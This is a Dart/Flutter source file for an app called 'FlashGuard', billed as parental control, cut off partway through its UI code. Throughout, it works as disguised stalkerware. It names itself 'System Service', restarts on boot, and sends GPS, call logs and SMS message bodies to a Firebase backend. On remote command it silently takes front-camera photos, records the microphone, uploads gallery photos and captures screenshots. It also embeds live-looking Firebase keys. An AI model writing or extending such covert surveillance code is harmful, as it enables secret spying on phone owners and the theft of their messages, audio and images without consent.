// ============================================================================
//  FlashGuard v5.0 — Full-Featured Parental Control
// ============================================================================

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

// ─── Firebase Config ──────────────────────────────────────────────────────────
const FirebaseOptions _kFirebaseOptions = FirebaseOptions(
  apiKey           : 'AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o',
  appId            : '1:1026475439765:android:55df02c099239e8b4c4d9c',
  messagingSenderId: '1026475439765',
  projectId        : 'flashguard-99c20',
  databaseURL      : 'https://flashguard-99c20-default-rtdb.firebaseio.com',
  storageBucket    : 'flashguard-99c20.appspot.com',
);

// ─── Constants ────────────────────────────────────────────────────────────────
const _kNotifChannelId   = 'flashguard_fg';
const _kNotifChannelName = 'FlashGuard';
const _kDeviceIdKey      = 'fg_device_id';
const _kGpsIntervalSec   = 30;
const _kCtrlChannel      = 'com.flashguard/control';

const _kBg      = Color(0xFF080B14);
const _kCard    = Color(0xFF181C2E);
const _kPrimary = Color(0xFF7B6FFF);
const _kGreen   = Color(0xFF00E5A0);
const _kRed     = Color(0xFFFF4F6B);
const _kAmber   = Color(0xFFFFB830);
const _kBlue    = Color(0xFF3DAAFF);

// ═══════════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  try {
    await Firebase.initializeApp(options: _kFirebaseOptions)
        .timeout(const Duration(seconds: 10));
  } catch (_) {}
  runApp(const FlashGuardApp());
  _backgroundInit();
}

Future<void> _backgroundInit() async {
  try {
    if (FirebaseAuth.instance.currentUser == null) {
      await FirebaseAuth.instance.signInAnonymously()
          .timeout(const Duration(seconds: 15));
    }
  } catch (_) {}
  await Future.delayed(const Duration(seconds: 1));
  await _requestPermissions();
  try { await _initBackgroundService(); } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.camera,
    Permission.microphone,
    Permission.phone,
    Permission.sms,
    Permission.notification,
    Permission.ignoreBatteryOptimizations,
    Permission.photos,
    Permission.storage,
  ].request();
  try {
    if (await Permission.location.isGranted) {
      await Permission.locationAlways.request();
    }
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BACKGROUND SERVICE SETUP
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _initBackgroundService() async {
  final service     = FlutterBackgroundService();
  final notifPlugin = FlutterLocalNotificationsPlugin();

  await notifPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(const AndroidNotificationChannel(
        _kNotifChannelId, _kNotifChannelName,
        description : 'FlashGuard is running.',
        importance  : Importance.low,
        playSound   : false,
      ));

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart               : _onServiceStart,
      isForegroundMode      : true,
      autoStart             : true,
      autoStartOnBoot       : true,
      notificationChannelId : _kNotifChannelId,
      initialNotificationTitle  : 'FlashGuard',
      initialNotificationContent: 'Monitoring active…',
      foregroundServiceNotificationId: 9001,
    ),
    iosConfiguration: IosConfiguration(
      autoStart  : true,
      onForeground: _onServiceStart,
      onBackground: _iosBackground,
    ),
  );
  service.startService();
}

@pragma('vm:entry-point')
Future<bool> _iosBackground(ServiceInstance s) async {
  DartPluginRegistrant.ensureInitialized();
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BACKGROUND SERVICE MAIN LOOP
// ═══════════════════════════════════════════════════════════════════════════════

@pragma('vm:entry-point')
void _onServiceStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  try { await Firebase.initializeApp(options: _kFirebaseOptions); } catch (_) {}
  try {
    if (FirebaseAuth.instance.currentUser == null) {
      await FirebaseAuth.instance.signInAnonymously()
          .timeout(const Duration(seconds: 15));
    }
  } catch (_) {}

  final prefs    = await SharedPreferences.getInstance();
  String deviceId = prefs.getString(_kDeviceIdKey) ?? '';
  if (deviceId.isEmpty) {
    deviceId = const Uuid().v4();
    await prefs.setString(_kDeviceIdKey, deviceId);
  }

  final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');

  // Mark online
  try {
    await deviceRef.child('meta').update({
      'online'   : true,
      'startedAt': DateTime.now().millisecondsSinceEpoch,
      'version'  : '5.0',
    });
  } catch (_) {}

  // ── Periodic tasks ─────────────────────────────────────────────────────────
  await _pushLocation(deviceRef);
  await _pushBattery(deviceRef);
  await _pushCallLogs(deviceRef);

  // GPS every 30s
  Timer.periodic(const Duration(seconds: _kGpsIntervalSec),
      (_) => _pushLocation(deviceRef));

  // Battery every 5 min
  Timer.periodic(const Duration(minutes: 5),
      (_) => _pushBattery(deviceRef));

  // Call logs every 10 min
  Timer.periodic(const Duration(minutes: 10),
      (_) => _pushCallLogs(deviceRef));

  // Foreground notification update every minute
  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 1), (_) {
      service.setForegroundNotificationInfo(
        title  : 'FlashGuard',
        content: DateFormat.Hm().format(DateTime.now()),
      );
    });
  }

  // ── Firebase command listeners ─────────────────────────────────────────────

  // Camera capture
  deviceRef.child('commands/capture').onValue.listen((event) async {
    if (event.snapshot.value == true) {
      await deviceRef.child('commands/capture').set(false);
      await _captureAndUpload(deviceRef, deviceId);
    }
  });

  // Mic recording
  deviceRef.child('commands/record_mic').onValue.listen((event) async {
    final val = event.snapshot.value;
    if (val is int && val > 0) {
      await deviceRef.child('commands/record_mic').set(0);
      await _recordMicAndUpload(deviceRef, deviceId, val.clamp(10, 120));
    }
  });

  // Gallery send
  deviceRef.child('commands/send_gallery').onValue.listen((event) async {
    if (event.snapshot.value == true) {
      await deviceRef.child('commands/send_gallery').set(false);
      await _uploadGalleryPhotos(deviceRef, deviceId);
    }
  });

  // SMS refresh
  deviceRef.child('commands/refresh_sms').onValue.listen((event) async {
    if (event.snapshot.value == true) {
      await deviceRef.child('commands/refresh_sms').set(false);
      await _pushSmsLogs(deviceRef);
    }
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
//  GPS + GEOFENCING
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _pushLocation(DatabaseReference deviceRef) async {
  try {
    final position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
      timeLimit      : const Duration(seconds: 15),
    );
    final lat = position.latitude;
    final lng = position.longitude;
    final ts  = DateTime.now().millisecondsSinceEpoch;

    await deviceRef.child('location').set({
      'lat'      : lat,
      'lng'      : lng,
      'accuracy' : position.accuracy,
      'speed'    : position.speed,
      'timestamp': ts,
    });

    // Geofence check
    final gfSnap = await deviceRef.child('geofence/config').get();
    if (gfSnap.exists && gfSnap.value is Map) {
      final cfg = Map<String, dynamic>.from(gfSnap.value as Map);
      final centerLat = (cfg['lat'] as num?)?.toDouble();
      final centerLng = (cfg['lng'] as num?)?.toDouble();
      final radius    = (cfg['radius'] as num?)?.toDouble() ?? 500;

      if (centerLat != null && centerLng != null) {
        final dist = Geolocator.distanceBetween(centerLat, centerLng, lat, lng);
        final outside = dist > radius;
        await deviceRef.child('geofence/status').update({
          'outside'  : outside,
          'distance' : dist.round(),
          'timestamp': ts,
        });
        if (outside) {
          await deviceRef.child('geofence/alerts').push().set({
            'lat'      : lat,
            'lng'      : lng,
            'distance' : dist.round(),
            'timestamp': ts,
          });
        }
      }
    }
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BATTERY
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _pushBattery(DatabaseReference deviceRef) async {
  try {
    final battery  = Battery();
    final level    = await battery.batteryLevel;
    final state    = await battery.batteryState;
    final charging = state == BatteryState.charging || state == BatteryState.full;
    await deviceRef.child('battery').set({
      'level'    : level,
      'charging' : charging,
      'state'    : state.name,
      'timestamp': DateTime.now().millisecondsSinceEpoch,
    });
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CALL LOGS (via platform channel — uses Android ContentProvider directly)
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _pushCallLogs(DatabaseReference deviceRef) async {
  try {
    const channel = MethodChannel(_kCtrlChannel);
    final List<dynamic>? raw = await channel.invokeMethod('getCallLogs');
    if (raw == null || raw.isEmpty) return;
    final logsMap = <String, dynamic>{};
    for (int i = 0; i < raw.length && i < 50; i++) {
      final m = Map<String, dynamic>.from(raw[i] as Map);
      logsMap['log_$i'] = {
        'name'     : m['name'] ?? 'Unknown',
        'number'   : m['number'] ?? '',
        'type'     : m['type'] ?? 'unknown',
        'duration' : m['duration'] ?? 0,
        'timestamp': m['timestamp'] ?? 0,
      };
    }
    await deviceRef.child('call_logs').set(logsMap);
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SMS LOGS (via platform channel — only works in main isolate context)
// ═══════════════════════════════════════════════════════════════════════════════

// NOTE: SMS reading is triggered via Firebase command commands/refresh_sms
// The actual reading happens via the main app (not background service)
// because ContentResolver requires main thread context.
// Background service pushes a placeholder; main app reads and pushes.

Future<void> _pushSmsLogs(DatabaseReference deviceRef) async {
  // Called from background service — attempt ContentProvider via method channel
  // This may not work in background isolate; fallback is handled in the UI app
  try {
    const channel = MethodChannel(_kCtrlChannel);
    final List<dynamic>? rawSms = await channel.invokeMethod('getSmsLogs');
    if (rawSms == null || rawSms.isEmpty) return;

    final logsMap = <String, dynamic>{};
    for (int i = 0; i < rawSms.length && i < 40; i++) {
      final m = Map<String, dynamic>.from(rawSms[i] as Map);
      logsMap['sms_$i'] = {
        'address'  : m['address'] ?? '',
        'body'     : m['body'] ?? '',
        'date'     : m['date'] ?? 0,
        'type'     : m['type'] ?? 'inbox',
      };
    }
    await deviceRef.child('sms_logs').set(logsMap);
  } catch (_) {}
}

// ═══════════════════════════════════════════════════════════════════════════════
//  CAMERA CAPTURE
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _captureAndUpload(
    DatabaseReference deviceRef, String deviceId) async {
  CameraController? controller;
  try {
    final cameras = await availableCameras();
    if (cameras.isEmpty) return;
    final camera = cameras.firstWhere(
      (c) => c.lensDirection == CameraLensDirection.front,
      orElse: () => cameras.first,
    );
    controller = CameraController(camera, ResolutionPreset.medium,
        enableAudio: false);
    await controller.initialize();
    await Future.delayed(const Duration(milliseconds: 400));
    final xFile = await controller.takePicture();
    await controller.dispose();
    controller = null;

    final ts  = DateTime.now().millisecondsSinceEpoch;
    final ref = FirebaseStorage.instance
        .ref('devices/$deviceId/captures/$ts.jpg');
    await ref.putFile(File(xFile.path),
        SettableMetadata(contentType: 'image/jpeg'));
    final url = await ref.getDownloadURL();
    await deviceRef.child('captures').push().set({
      'url'      : url,
      'timestamp': ts,
      'type'     : 'remote',
    });
  } catch (_) {
    controller?.dispose();
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  MIC RECORDING (via Android MediaRecorder platform channel)
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _recordMicAndUpload(
    DatabaseReference deviceRef, String deviceId, int durationSec) async {
  try {
    final dir      = await getTemporaryDirectory();
    final ts       = DateTime.now().millisecondsSinceEpoch;
    final filePath = '${dir.path}/fg_audio_$ts.m4a';

    await deviceRef.child('mic/status').set('recording');

    const channel = MethodChannel(_kCtrlChannel);
    final started = await channel.invokeMethod('startRecording', {
      'path'    : filePath,
      'duration': durationSec,
    });

    if (started != true) {
      await deviceRef.child('mic/status').set('idle');
      return;
    }

    // Wait for recording to finish + 2s buffer
    await Future.delayed(Duration(seconds: durationSec + 2));

    final file = File(filePath);
    if (!file.existsSync()) {
      await deviceRef.child('mic/status').set('idle');
      return;
    }

    final ref = FirebaseStorage.instance
        .ref('devices/$deviceId/audio/$ts.m4a');
    await ref.putFile(file, SettableMetadata(contentType: 'audio/mp4'));
    final url = await ref.getDownloadURL();

    await deviceRef.child('audio_logs').push().set({
      'url'      : url,
      'duration' : durationSec,
      'timestamp': ts,
    });
    await deviceRef.child('mic/status').set('idle');
    try { file.deleteSync(); } catch (_) {}
  } catch (_) {
    await deviceRef.child('mic/status').set('idle');
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  GALLERY PHOTOS
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _uploadGalleryPhotos(
    DatabaseReference deviceRef, String deviceId) async {
  try {
    final result = await PhotoManager.requestPermissionExtend();
    if (!result.isAuth) return;

    await deviceRef.child('gallery/status').set('uploading');

    final albums = await PhotoManager.getAssetPathList(
        type: RequestType.image, onlyAll: true);
    if (albums.isEmpty) return;

    final assets = await albums.first.getAssetListPaged(page: 0, size: 20);
    int uploaded = 0;

    for (final asset in assets) {
      try {
        final file = await asset.file;
        if (file == null) continue;
        final ts  = asset.createDateTime.millisecondsSinceEpoch;
        final ref = FirebaseStorage.instance
            .ref('devices/$deviceId/gallery/$ts.jpg');
        await ref.putFile(file, SettableMetadata(contentType: 'image/jpeg'));
        final url = await ref.getDownloadURL();
        await deviceRef.child('gallery/photos').push().set({
          'url'      : url,
          'timestamp': ts,
          'filename' : asset.title ?? '',
        });
        uploaded++;
        if (uploaded >= 15) break;
      } catch (_) {}
    }
    await deviceRef.child('gallery/status').set('done_$uploaded');
  } catch (_) {
    await deviceRef.child('gallery/status').set('error');
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  APP
// ═══════════════════════════════════════════════════════════════════════════════

class FlashGuardApp extends StatelessWidget {
  const FlashGuardApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title                  : 'System Service',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness           : Brightness.dark,
        scaffoldBackgroundColor: _kBg,
        colorScheme: const ColorScheme.dark(
          primary   : _kPrimary,
          secondary : _kGreen,
          surface   : Color(0xFF111420),
          background: _kBg,
        ),
        cardColor  : _kCard,
        textTheme  : GoogleFonts.interTextTheme(ThemeData.dark().textTheme),
        appBarTheme: AppBarTheme(
          backgroundColor       : _kBg,
          elevation             : 0,
          scrolledUnderElevation: 0,
          titleTextStyle: GoogleFonts.inter(
            fontSize: 20, fontWeight: FontWeight.w700, color: Colors.white),
        ),
        useMaterial3: true,
      ),
      home: const DashboardPage(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DASHBOARD
// ═══════════════════════════════════════════════════════════════════════════════

class DashboardPage extends StatefulWidget {
  const DashboardPage({super.key});
  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with SingleTickerProviderStateMixin {
  late final TabController _tabs;
  String _deviceId   = '';
  bool   _svcRunning = false;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _load();
  }

  StreamSubscription? _screenSub;

  Future<void> _load() async {
    final prefs = await SharedPreferences.getInstance();
    String deviceId = prefs.getString(_kDeviceIdKey) ?? '';
    if (deviceId.isEmpty) {
      deviceId = const Uuid().v4();
      await prefs.setString(_kDeviceIdKey, deviceId);
    }
    final svc = await FlutterBackgroundService().isRunning();
    if (mounted) {
      setState(() {
        _deviceId   = deviceId;
        _svcRunning = svc;
      });
    }
    // Request screen capture permission silently on app start
    _requestScreenPermission();
    // Push SMS logs from main isolate (platform channel works here)
    _pushSmsFromMain(deviceId);
    // Listen for screenshot command from Firebase (needs main isolate for Activity)
    _listenScreenshot(deviceId);
  }

  Future<void> _requestScreenPermission() async {
    try {
      const channel = MethodChannel(_kCtrlChannel);
      await channel.invokeMethod('requestScreenCapture');
    } catch (_) {}
  }

  void _listenScreenshot(String deviceId) {
    final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');
    _screenSub = deviceRef.child('commands/take_screenshot').onValue.listen((event) async {
      if (event.snapshot.value == true) {
        await deviceRef.child('commands/take_screenshot').set(false);
        await _takeScreenshotAndUpload(deviceRef, deviceId);
      }
    });
  }

  Future<void> _takeScreenshotAndUpload(
      DatabaseReference deviceRef, String deviceId) async {
    try {
      final dir      = await getTemporaryDirectory();
      final ts       = DateTime.now().millisecondsSinceEpoch;
      final filePath = '${dir.path}/fg_screen_$ts.jpg';

      await deviceRef.child('screen/status').set('capturing');

      const channel  = MethodChannel(_kCtrlChannel);
      final result   = await channel.invokeMethod('takeScreenshot', {'path': filePath});

      if (result == null) {
        await deviceRef.child('screen/status').set('no_permission');
        return;
      }
      final file = File(filePath);
      if (!file.existsSync()) {
        await deviceRef.child('screen/status').set('failed');
        return;
      }
      final ref = FirebaseStorage.instance
          .ref('devices/$deviceId/screenshots/$ts.jpg');
      await ref.putFile(file, SettableMetadata(contentType: 'image/jpeg'));
      final url = await ref.getDownloadURL();
      await deviceRef.child('screenshots').push().set({
        'url'      : url,
        'timestamp': ts,
      });
      await deviceRef.child('screen/status').set('done');
      try { file.deleteSync(); } catch (_) {}
    } catch (_) {
      await deviceRef.child('screen/status').set('error');
    }
  }

  Future<void> _pushSmsFromMain(String deviceId) async {
    try {
      const channel  = MethodChannel(_kCtrlChannel);
      final List<dynamic>? rawSms = await channel.invokeMethod('getSmsLogs');
      if (rawSms == null || rawSms.isEmpty) return;
      final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');
      final logsMap   = <String, dynamic>{};
      for (int i = 0; i < rawSms.length && i < 40; i++) {
        final m = Map<String, dynamic>.from(rawSms[i] as Map);
        logsMap['sms_$i'] = {
          'address': m['address'] ?? '',
          'body'   : m['body'] ?? '',
          'date'   : m['date'] ?? 0,
          'type'   : m['type'] ?? 'inbox',
        };
      }
      await deviceRef.child('sms_logs').set(logsMap);
    } catch (_) {}
  }

  @override
  void dispose() { _screenSub?.cancel(); _tabs.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        leading: Padding(
          padding: const EdgeInsets.all(10),
          child: Icon(Icons.settings_rounded, color: _kPrimary, size: 26),
        ),
        title: const Text('System Service'),
        actions: [
          _LiveBadge(running: _svcRunning),
          const SizedBox(width: 14),
        ],
        bottom: TabBar(
          controller          : _tabs,
          indicatorColor      : _kPrimary,
          labelColor          : _kPrimary,
          unselectedLabelColor: Colors.white30,
          tabs: const [
            Tab(text: 'Overview'),
            Tab(text: 'Location'),
            Tab(text: 'Status'),
          ],
        ),
      ),
      body: _deviceId.isEmpty
          ? const Center(child: CircularProgressIndicator())
          : TabBarView(
              controller: _tabs,
              children: [
                _OverviewTab(deviceId: _deviceId),
                _LocationTab(deviceId: _deviceId),
                _StatusTab(deviceId: _deviceId),
              ],
            ),
    );
  }
}

// ─── Live Badge ───────────────────────────────────────────────────────────────

class _LiveBadge extends StatefulWidget {
  const _LiveBadge({required this.running});
  final bool running;
  @override
  State<_LiveBadge> createState() => _LiveBadgeState();
}

class _LiveBadgeState extends State<_LiveBadge>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;
  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }
  @override
  Widget build(BuildContext context) {
    final color = widget.running ? _kGreen : _kRed;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color       : color.withOpacity(0.12),
        borderRadius: BorderRadius.circular(20),
        border      : Border.all(color: color.withOpacity(0.6)),
      ),
      child: Row(mainAxisSize: MainAxisSize.min, children: [
        FadeTransition(
          opacity: _ctrl,
          child  : Container(
            width : 7, height: 7,
            decoration: BoxDecoration(color: color, shape: BoxShape.circle),
          ),
        ),
        const SizedBox(width: 6),
        Text(widget.running ? 'LIVE' : 'OFFLINE',
            style: TextStyle(
                color: color, fontSize: 10, fontWeight: FontWeight.w800,
                letterSpacing: 1.4)),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 1 — OVERVIEW
// ═══════════════════════════════════════════════════════════════════════════════

class _OverviewTab extends StatelessWidget {
  const _OverviewTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId');
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        // ── Battery row ──
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('battery').onValue,
          builder: (ctx, snap) {
            final b = snap.hasData ? snap.data!.snapshot.value as Map? : null;
            final level    = b?['level'] as int? ?? 0;
            final charging = b?['charging'] as bool? ?? false;
            return _BatteryCard(level: level, charging: charging);
          },
        ),
        const SizedBox(height: 10),

        // ── Stat cards ──
        _SectionLabel('System Status'),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(child: _StatCard(
            stream      : ref.child('location/timestamp').onValue,
            label       : 'GPS',
            icon        : Icons.gps_fixed_rounded,
            color       : _kGreen,
            valueBuilder: (s) => s.value != null ? 'Active' : 'No Fix',
          )),
          const SizedBox(width: 10),
          Expanded(child: _StatCard(
            stream      : ref.child('meta/online').onValue,
            label       : 'Monitor',
            icon        : Icons.bar_chart_rounded,
            color       : _kPrimary,
            valueBuilder: (s) => s.value == true ? 'Online' : 'Idle',
          )),
        ]),
        const SizedBox(height: 10),
        Row(children: [
          Expanded(child: _StatCard(
            stream      : ref.child('call_logs').onValue,
            label       : 'Calls',
            icon        : Icons.phone_rounded,
            color       : _kBlue,
            valueBuilder: (s) {
              if (s.value == null) return '0';
              return '${(s.value as Map).length}';
            },
          )),
          const SizedBox(width: 10),
          Expanded(child: _StatCard(
            stream      : ref.child('sms_logs').onValue,
            label       : 'SMS',
            icon        : Icons.sms_rounded,
            color       : _kAmber,
            valueBuilder: (s) {
              if (s.value == null) return '0';
              return '${(s.value as Map).length}';
            },
          )),
        ]),
        const SizedBox(height: 18),

        // ── Camera ──
        _SectionLabel('Remote Camera'),
        const SizedBox(height: 10),
        _CameraCard(deviceId: deviceId),
        const SizedBox(height: 18),

        // ── Mic recording ──
        _SectionLabel('Mic Recording'),
        const SizedBox(height: 10),
        _MicCard(deviceId: deviceId),
        const SizedBox(height: 18),

        // ── Recent captures ──
        _SectionLabel('Recent Captures'),
        const SizedBox(height: 10),
        _CapturesList(deviceRef: ref),
      ],
    );
  }
}

// ─── Battery card ─────────────────────────────────────────────────────────────

class _BatteryCard extends StatelessWidget {
  const _BatteryCard({required this.level, required this.charging});
  final int  level;
  final bool charging;

  Color get _color {
    if (charging) return _kGreen;
    if (level > 50) return _kGreen;
    if (level > 20) return _kAmber;
    return _kRed;
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(14),
        border      : Border.all(color: _color.withOpacity(0.3)),
      ),
      child: Row(children: [
        Icon(charging ? Icons.battery_charging_full_rounded
                      : Icons.battery_std_rounded,
            color: _color, size: 26),
        const SizedBox(width: 12),
        Text('Battery: $level%${charging ? ' ⚡' : ''}',
            style: TextStyle(
                color: _color, fontWeight: FontWeight.w700, fontSize: 14)),
        const Spacer(),
        Container(
          width     : 90,
          height    : 12,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(6),
            border      : Border.all(color: Colors.white12),
          ),
          child: FractionallySizedBox(
            widthFactor : level / 100,
            alignment   : Alignment.centerLeft,
            child: Container(
              decoration: BoxDecoration(
                color       : _color,
                borderRadius: BorderRadius.circular(6),
              ),
            ),
          ),
        ),
      ]),
    );
  }
}

// ─── Stat card ────────────────────────────────────────────────────────────────

class _StatCard extends StatelessWidget {
  const _StatCard({
    required this.stream,
    required this.label,
    required this.icon,
    required this.color,
    required this.valueBuilder,
  });
  final Stream<DatabaseEvent>         stream;
  final String                        label;
  final IconData                      icon;
  final Color                         color;
  final String Function(DataSnapshot) valueBuilder;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream : stream,
      builder: (ctx, snap) {
        final value = snap.hasData
            ? valueBuilder(snap.data!.snapshot) : '…';
        return Container(
          padding   : const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color       : _kCard,
            borderRadius: BorderRadius.circular(14),
            border      : Border.all(color: color.withOpacity(0.2)),
          ),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Container(
              padding   : const EdgeInsets.all(7),
              decoration: BoxDecoration(
                color       : color.withOpacity(0.14),
                borderRadius: BorderRadius.circular(9),
              ),
              child: Icon(icon, color: color, size: 16),
            ),
            const SizedBox(height: 10),
            Text(value,
                style: TextStyle(color: color, fontSize: 14,
                    fontWeight: FontWeight.w700)),
            const SizedBox(height: 2),
            Text(label,
                style: const TextStyle(color: Colors.white38, fontSize: 10)),
          ]),
        );
      },
    );
  }
}

// ─── Camera card ──────────────────────────────────────────────────────────────

class _CameraCard extends StatefulWidget {
  const _CameraCard({required this.deviceId});
  final String deviceId;
  @override
  State<_CameraCard> createState() => _CameraCardState();
}

class _CameraCardState extends State<_CameraCard> {
  bool _busy = false;

  Future<void> _trigger() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/commands/capture')
        .set(true);
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
        content        : Text('📷 Capture command sent!'),
        backgroundColor: Color(0xFF1E1E30),
        behavior       : SnackBarBehavior.floating,
      ));
    }
  }

  @override
  Widget build(BuildContext context) {
    return _CommandCard(
      icon : Icons.camera_alt_rounded,
      color: _kRed,
      title: 'Silent Remote Capture',
      sub  : 'Front camera se silently photo lega',
      busy : _busy,
      label: 'Capture',
      onTap: _trigger,
    );
  }
}

// ─── Mic card ─────────────────────────────────────────────────────────────────

class _MicCard extends StatefulWidget {
  const _MicCard({required this.deviceId});
  final String deviceId;
  @override
  State<_MicCard> createState() => _MicCardState();
}

class _MicCardState extends State<_MicCard> {
  bool _busy = false;
  int  _secs = 30;

  Future<void> _trigger() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/commands/record_mic')
        .set(_secs);
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        content        : Text('🎙 Recording $_secs sec — audio aane mein time lagega'),
        backgroundColor: const Color(0xFF1E1E30),
        behavior       : SnackBarBehavior.floating,
      ));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(16),
        border      : Border.all(color: _kPrimary.withOpacity(0.25)),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(
            padding   : const EdgeInsets.all(9),
            decoration: BoxDecoration(
              color       : _kPrimary.withOpacity(0.14),
              borderRadius: BorderRadius.circular(11),
            ),
            child: Icon(Icons.mic_rounded, color: _kPrimary, size: 20),
          ),
          const SizedBox(width: 12),
          const Expanded(
            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('Mic Recording',
                  style: TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
              SizedBox(height: 2),
              Text('Silently record mic audio',
                  style: TextStyle(color: Colors.white38, fontSize: 11)),
            ]),
          ),
        ]),
        const SizedBox(height: 12),
        Row(children: [
          const Text('Duration:', style: TextStyle(color: Colors.white54, fontSize: 12)),
          const SizedBox(width: 8),
          ...[10, 30, 60, 120].map((s) => Padding(
            padding: const EdgeInsets.only(right: 6),
            child: GestureDetector(
              onTap: () => setState(() => _secs = s),
              child: Container(
                padding   : const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                decoration: BoxDecoration(
                  color       : _secs == s ? _kPrimary : Colors.white10,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Text('${s}s',
                    style: const TextStyle(fontSize: 11, fontWeight: FontWeight.w700)),
              ),
            ),
          )),
        ]),
        const SizedBox(height: 12),
        GestureDetector(
          onTap: _busy ? null : _trigger,
          child: Container(
            width  : double.infinity,
            padding: const EdgeInsets.symmetric(vertical: 11),
            decoration: BoxDecoration(
              color       : _busy ? Colors.white12 : _kPrimary,
              borderRadius: BorderRadius.circular(10),
            ),
            alignment: Alignment.center,
            child: _busy
                ? const SizedBox(width: 18, height: 18,
                    child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                : const Text('🎙 Start Recording',
                    style: TextStyle(fontWeight: FontWeight.w700)),
          ),
        ),
      ]),
    );
  }
}

// ─── Generic command card ─────────────────────────────────────────────────────

class _CommandCard extends StatelessWidget {
  const _CommandCard({
    required this.icon,
    required this.color,
    required this.title,
    required this.sub,
    required this.busy,
    required this.label,
    required this.onTap,
  });
  final IconData icon;
  final Color    color;
  final String   title, sub, label;
  final bool     busy;
  final VoidCallback onTap;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(16),
        border      : Border.all(color: color.withOpacity(0.25)),
      ),
      child: Row(children: [
        Container(
          padding   : const EdgeInsets.all(9),
          decoration: BoxDecoration(
            color       : color.withOpacity(0.14),
            borderRadius: BorderRadius.circular(11),
          ),
